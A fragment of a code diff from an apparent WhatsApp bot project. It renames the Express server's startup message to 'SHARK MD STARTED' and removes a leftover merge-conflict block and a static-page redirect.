+                  };;;;\n+item4.X-ABLabel:Region\nEND:VCARD`,
                 });
             }
             conn.sendMessage(
@@ -963,20 +886,10 @@ if (isBanned) return; // Ignore banned users completely
         };
     conn.serializeM = mek => sms(conn, mek, store);
   }
- /* 
+  
   app.get("/", (req, res) => {
-<<<<<<< HEAD
-  res.send("T20-CLASSIC-AISTARTED ✅");
-=======
-  res.send("IMMU STARTED ✅");
->>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
+  res.send("SHARK MD STARTED ✅");
   });
-*/
-  app.use(express.static(path.join(__dirname, 'lib')));
-
-app.get('/', (req, res) => {
-  res.redirect('/immutech.html');
-});
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
   connectToWA()
